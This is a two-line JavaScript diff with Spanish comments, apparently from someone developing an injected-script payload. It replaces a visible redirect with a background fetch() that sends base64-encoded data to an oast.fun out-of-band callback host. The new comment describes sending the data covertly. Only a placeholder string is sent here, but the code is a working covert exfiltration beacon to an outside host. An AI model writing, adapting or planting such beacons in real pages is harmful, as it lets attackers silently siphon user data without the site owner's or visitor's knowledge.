@@ -1,2 +1,2 @@
-// Prueba con un texto estático para ver si llega al log
-document.location = "https://wedwqcbkveknzrplplbbf2thxekxhd8hu.oast.fun/a?test=" + btoa("HolaIan");
+// Esto envía el dato por debajo de la mesa (background)
+fetch("https://wedwqcbkveknzrplplbbf2thxekxhd8hu.oast.fun/log?data=" + btoa("PruebaInvisible"));
